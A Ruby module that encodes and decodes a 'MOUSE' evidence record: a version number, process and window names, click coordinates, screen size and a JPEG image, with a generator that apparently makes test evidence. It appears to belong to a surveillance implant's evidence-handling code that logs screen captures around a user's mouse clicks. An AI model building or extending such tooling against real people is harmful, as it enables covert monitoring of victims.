require 'rcs-common/evidence/common'

module RCS

  module MouseEvidence

    MOUSE_VERSION = 2009040201

    def content
      path = File.join(File.dirname(__FILE__), 'content', 'mouse', '00' + (rand(4) + 1).to_s + '.jpg')
      File.open(path, 'rb') {|f| f.read }
    end

    def generate_content
      [ content ]
    end

    def additional_header
      process_name = 'Finder'.to_utf16le_binary
      window_name = ''.to_utf16le_binary
      x = 10
      y = 20
      width = 1280
      height = 800
      header = StringIO.new
      header.write [MOUSE_VERSION, process_name.size, window_name.size, x, y, width, height].pack("I*")
      header.write process_name
      header.write window_name

      header.string
    end

    def decode_additional_header(data)
      raise EvidenceDeserializeError.new("incomplete MOUSE") if data.nil? or data.size == 0

      binary = StringIO.new data

      version, process_name_len, window_name_len = binary.read(12).unpack('I*')
      raise EvidenceDeserializeError.new("invalid log version for MOUSE") unless version == MOUSE_VERSION

      x, y, width, height = binary.read(16).unpack('I*')

      @info[:process] = binary.read(process_name_len).utf16le_to_utf8
      @info[:window] = binary.read(window_name_len).utf16le_to_utf8
      @info[:x] = x
      @info[:y] = y
      @info[:width] = width
      @info[:height] = height
    end

    def decode_content
      @info[:content] = @info[:chunks].first
      @info[:size] = @info[:content].size
      return [self]
    end
  end


end # ::RCS